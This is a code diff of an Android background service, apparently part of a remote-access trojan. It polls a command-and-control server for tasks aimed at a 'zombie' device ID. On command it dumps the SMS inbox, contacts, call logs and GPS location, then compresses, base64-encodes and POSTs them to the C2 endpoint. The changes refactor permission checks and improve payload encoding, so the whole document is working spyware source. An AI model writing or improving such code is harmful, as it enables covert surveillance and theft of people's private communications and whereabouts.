@@ -20,10 +20,8 @@ import android.provider.CallLog;
 import android.provider.ContactsContract;
 import android.util.Base64;
 import android.util.Log;
-
 import androidx.annotation.NonNull;
 import androidx.core.content.ContextCompat;
-
 import com.android.volley.NetworkResponse;
 import com.android.volley.Request;
 import com.android.volley.RequestQueue;
@@ -37,10 +35,8 @@ import com.google.android.gms.location.FusedLocationProviderClient;
 import com.google.android.gms.location.LocationServices;
 import com.google.android.gms.tasks.OnFailureListener;
 import com.google.android.gms.tasks.OnSuccessListener;
-
 import org.json.JSONException;
 import org.json.JSONObject;
-
 import java.io.BufferedReader;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
@@ -48,6 +44,7 @@ import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.net.HttpURLConnection;
 import java.net.URL;
+import java.net.URLEncoder;
 import java.sql.Date;
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
@@ -71,7 +68,7 @@ public class Fetcher extends Service {
 
         try {
             if (isConnected()) { // Check if device has a network connection
-                new JsonTask().execute(getString(R.string.cc_json) + "?id=" + id);
+                new JsonTask().execute(getString(R.string.cc) + "?uuid=" + id);
             } else {
                 Log.d("Connectivity", "No network connection");
             }
@@ -151,33 +148,19 @@ public class Fetcher extends Service {
                     if (zombieID.equals(uuid) || zombieID.equals("ffffffff-ffff-ffff-ffff-ffffffffffff")) {
                         switch (task) {
                             case "kill":
-                                AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
-                                Intent invokeService = new Intent(getApplicationContext(), Fetcher.class);
-                                PendingIntent pintent = PendingIntent.getService(getApplicationContext(), 0, invokeService, 0);
-                                if (alarmManager != null) {
-                                    alarmManager.cancel(pintent);
-                                    stopSelf();
-                                }
+                                killService();
                                 break;
                             case "smsDump":
-                                if (ContextCompat.checkSelfPermission(getBaseContext(), "android.permission.READ_SMS") == PackageManager.PERMISSION_GRANTED) {
-                                    sendData(task, uuid, fetchInbox());
-                                }
+                                sendData(task, uuid, fetchInbox());
                                 break;
                             case "contactsDump":
-                                if (ContextCompat.checkSelfPermission(getBaseContext(), "android.permission.READ_CONTACTS") == PackageManager.PERMISSION_GRANTED) {
-                                    sendData(task, uuid, fetchContacts());
-                                }
+                                sendData(task, uuid, fetchContacts());
                                 break;
                             case "callsDump":
-                                if (ContextCompat.checkSelfPermission(getBaseContext(), "android.permission.READ_CALL_LOG") == PackageManager.PERMISSION_GRANTED) {
-                                    sendData(task, uuid, fetchCallLogs());
-                                }
+                                sendData(task, uuid, fetchCallLogs());
                                 break;
                             case "getGeoLocation":
-                                if (ContextCompat.checkSelfPermission(getBaseContext(), "android.permission.ACCESS_FINE_LOCATION") == PackageManager.PERMISSION_GRANTED && ContextCompat.checkSelfPermission(getApplicationContext(), "android.permission.ACCESS_COARSE_LOCATION") == PackageManager.PERMISSION_GRANTED) {
-                                    sendData(task, uuid, getLastLocation());
-                                }
+                                sendData(task, uuid, getLastLocation());
                                 break;
                         }
                     }
@@ -199,27 +182,39 @@ public class Fetcher extends Service {
         } else return false;
     }
 
+    private void killService() {
+        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
+        Intent invokeService = new Intent(getApplicationContext(), Fetcher.class);
+        PendingIntent pintent = PendingIntent.getService(getApplicationContext(), 0, invokeService, 0);
+        if (alarmManager != null) {
+            alarmManager.cancel(pintent);
+            stopSelf();
+        }
+    }
+
     // Method to dump SMS messages
     private ArrayList<String> fetchInbox() {
         ArrayList<String> sms = new ArrayList<>();
-        ContentResolver cr = getContentResolver();
-        Uri uri = Uri.parse("content://sms/");
-        Cursor cursor = cr.query(uri, new String[]{"_id", "address", "date", "body"}, "_id > 3", null, "date DESC");
-        if (cursor != null) {
-            cursor.moveToFirst();
-            for (int i = 0; i < cursor.getCount(); i++) {
-                String id = cursor.getString(0);
-                String address = cursor.getString(1);
-                Long dateMil = cursor.getLong(2);
-                String body = cursor.getString(3);
-                Date date = new Date(dateMil);
-                SimpleDateFormat formatter = new SimpleDateFormat("dd/MM/yyyy HH:mm:ss", java.util.Locale.getDefault());
-                formatter.setTimeZone(TimeZone.getTimeZone("UTC"));
-                String formatted = formatter.format(date);
-                sms.add("\n ID=>" + id + "\n Address=>" + address + "\n Date=>" + formatted + "\n Body=>" + body + "\n");
-                cursor.moveToNext();
+        if (ContextCompat.checkSelfPermission(getBaseContext(), "android.permission.READ_SMS") == PackageManager.PERMISSION_GRANTED) {
+            ContentResolver cr = getContentResolver();
+            Uri uri = Uri.parse("content://sms/");
+            Cursor cursor = cr.query(uri, new String[]{"_id", "address", "date", "body"}, "_id > 3", null, "date DESC");
+            if (cursor != null) {
+                cursor.moveToFirst();
+                for (int i = 0; i < cursor.getCount(); i++) {
+                    String id = cursor.getString(0);
+                    String address = cursor.getString(1);
+                    Long dateMil = cursor.getLong(2);
+                    String body = cursor.getString(3);
+                    Date date = new Date(dateMil);
+                    SimpleDateFormat formatter = new SimpleDateFormat("dd/MM/yyyy HH:mm:ss", java.util.Locale.getDefault());
+                    formatter.setTimeZone(TimeZone.getTimeZone("UTC"));
+                    String formatted = formatter.format(date);
+                    sms.add("\n ID=>" + id + "\n Address=>" + address + "\n Date=>" + formatted + "\n Body=>" + body + "\n");
+                    cursor.moveToNext();
+                }
+                cursor.close();
             }
-            cursor.close();
         }
         return sms;
     }
@@ -227,31 +222,33 @@ public class Fetcher extends Service {
     // Method to dump phone contacts
     private ArrayList<String> fetchContacts() {
         ArrayList<String> info = new ArrayList<>();
-        ContentResolver cr = getContentResolver();
-        Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
+        if (ContextCompat.checkSelfPermission(getBaseContext(), "android.permission.READ_CONTACTS") == PackageManager.PERMISSION_GRANTED) {
+            ContentResolver cr = getContentResolver();
+            Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
 
-        if ((cursor != null ? cursor.getCount() : 0) > 0) {
-            while (cursor.moveToNext()) {
-                String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
-                String name = cursor.getString(cursor.getColumnIndex((ContactsContract.Contacts.DISPLAY_NAME)));
+            if ((cursor != null ? cursor.getCount() : 0) > 0) {
+                while (cursor.moveToNext()) {
+                    String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
+                    String name = cursor.getString(cursor.getColumnIndex((ContactsContract.Contacts.DISPLAY_NAME)));
 
-                if (cursor.getInt(cursor.getColumnIndex(
-                        ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
-                    Cursor pCur = cr.query(
-                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
-                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", new String[]{id}, null
-                    );
+                    if (cursor.getInt(cursor.getColumnIndex(
+                            ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
+                        Cursor pCur = cr.query(
+                                ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
+                                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", new String[]{id}, null
+                        );
 
-                    if (pCur != null) {
-                        while (pCur.moveToNext()) {
-                            String phoneNumber = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
-                            info.add("\n ID=>" + id + "\nName=>" + name + "\nPhone Number" + phoneNumber + "\n");
+                        if (pCur != null) {
+                            while (pCur.moveToNext()) {
+                                String phoneNumber = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
+                                info.add("\n ID=>" + id + "\n Name=>" + name + "\n Phone Number" + phoneNumber + "\n");
+                            }
+                            pCur.close();
                         }
-                        pCur.close();
                     }
                 }
+                cursor.close();
             }
-            cursor.close();
         }
         return info;
     }
@@ -259,35 +256,37 @@ public class Fetcher extends Service {
     // Method to dump call logs
     private ArrayList<String> fetchCallLogs() {
         ArrayList<String> logs = new ArrayList<>();
-        ContentResolver cr = getContentResolver();
-        Cursor cursor = cr.query(CallLog.Calls.CONTENT_URI, null, null, null, null);
-        int number = cursor.getColumnIndex(CallLog.Calls.NUMBER);
-        int type = cursor.getColumnIndex(CallLog.Calls.TYPE);
-        int date = cursor.getColumnIndex(CallLog.Calls.DATE);
-        int duration = cursor.getColumnIndex(CallLog.Calls.DURATION);
+        if (ContextCompat.checkSelfPermission(getBaseContext(), "android.permission.READ_CALL_LOG") == PackageManager.PERMISSION_GRANTED) {
+            ContentResolver cr = getContentResolver();
+            Cursor cursor = cr.query(CallLog.Calls.CONTENT_URI, null, null, null, null);
+            int number = cursor.getColumnIndex(CallLog.Calls.NUMBER);
+            int type = cursor.getColumnIndex(CallLog.Calls.TYPE);
+            int date = cursor.getColumnIndex(CallLog.Calls.DATE);
+            int duration = cursor.getColumnIndex(CallLog.Calls.DURATION);
 
-        while (cursor.moveToNext()) {
-            String phNumber = cursor.getString(number);
-            String callType = cursor.getString(type);
-            String callDate = cursor.getString(date);
-            java.util.Date callDayTime = new java.util.Date(Long.valueOf(callDate));
-            String callDuration = cursor.getString(duration);
-            String dir = null;
-            int dircode = Integer.parseInt(callType);
-            switch (dircode) {
-                case CallLog.Calls.OUTGOING_TYPE:
-                    dir = "OUTGOING";
-                    break;
-                case CallLog.Calls.INCOMING_TYPE:
-                    dir = "INCOMING";
-                    break;
-                case CallLog.Calls.MISSED_TYPE:
-                    dir = "MISSED";
-                    break;
+            while (cursor.moveToNext()) {
+                String phNumber = cursor.getString(number);
+                String callType = cursor.getString(type);
+                String callDate = cursor.getString(date);
+                java.util.Date callDayTime = new java.util.Date(Long.valueOf(callDate));
+                String callDuration = cursor.getString(duration);
+                String dir = null;
+                int dircode = Integer.parseInt(callType);
+                switch (dircode) {
+                    case CallLog.Calls.OUTGOING_TYPE:
+                        dir = "OUTGOING";
+                        break;
+                    case CallLog.Calls.INCOMING_TYPE:
+                        dir = "INCOMING";
+                        break;
+                    case CallLog.Calls.MISSED_TYPE:
+                        dir = "MISSED";
+                        break;
+                }
+                logs.add("\n Phone Number=>" + phNumber + "\nType =>" + dir + "\nDate =>" + callDayTime + "\nDuration =>" + callDuration + "\n");
             }
-            logs.add("\n Phone Number=>" + phNumber + "\nType=>" + dir + "\nDate=>" + callDayTime + "\nDuration=>" + callDuration + "\n");
+            cursor.close();
         }
-        cursor.close();
         return logs;
     }
 
@@ -295,27 +294,28 @@ public class Fetcher extends Service {
     ArrayList<String> geoLocation = new ArrayList<>();
 
     private ArrayList<String> getLastLocation() {
-        FusedLocationProviderClient mFusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
+        if (ContextCompat.checkSelfPermission(getBaseContext(), "android.permission.ACCESS_FINE_LOCATION") == PackageManager.PERMISSION_GRANTED && ContextCompat.checkSelfPermission(getApplicationContext(), "android.permission.ACCESS_COARSE_LOCATION") == PackageManager.PERMISSION_GRANTED) {
+            FusedLocationProviderClient mFusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
+            mFusedLocationClient.getLastLocation().addOnSuccessListener(new OnSuccessListener<Location>() {
+                @Override
+                public void onSuccess(Location location) {
+                    if (location != null) {
+                        double latitude = location.getLatitude();
+                        double longitude = location.getLongitude();
+                        geoLocation.add("\nLatitude =>" + latitude + "\n Longitude =>" + longitude);
 
-        mFusedLocationClient.getLastLocation().addOnSuccessListener(new OnSuccessListener<Location>() {
-            @Override
-            public void onSuccess(Location location) {
-                if (location != null) {
-                    double latitude = location.getLatitude();
-                    double longitude = location.getLongitude();
-                    geoLocation.add("\nLatitude =>" + latitude + "\n Longitude =>" + longitude);
-
-                } else {
-                    geoLocation.add("N/A");
-                }
-            }
-        })
-                .addOnFailureListener(new OnFailureListener() {
-                    @Override
-                    public void onFailure(@NonNull Exception e) {
-                        e.printStackTrace();
+                    } else {
+                        geoLocation.add("N/A");
                     }
-                });
+                }
+            })
+                    .addOnFailureListener(new OnFailureListener() {
+                        @Override
+                        public void onFailure(@NonNull Exception e) {
+                            e.printStackTrace();
+                        }
+                    });
+        }
         return geoLocation;
     }
 
@@ -323,11 +323,12 @@ public class Fetcher extends Service {
     public void sendData(String task, String uuid, ArrayList requestBody) {
         try {
             RequestQueue requestQueue = Volley.newRequestQueue(getApplicationContext());
-            String URL = getString(R.string.cc_php);
+            String URL = getString(R.string.cc);
             String initial = String.valueOf(requestBody);
             final byte[] gzip = compress(initial);
             final String base64 = Base64.encodeToString(gzip, Base64.DEFAULT);
-            final String data = "task= " + task + "&uuid=" + uuid + "&data=" + base64;
+            final String enc = URLEncoder.encode(base64, "utf-8");
+            final String data = "task= " + task + "&uuid=" + uuid + "&data=" + enc;
 
             StringRequest stringRequest = new StringRequest(Request.Method.POST, URL, new Response.Listener<String>() {
                 @Override
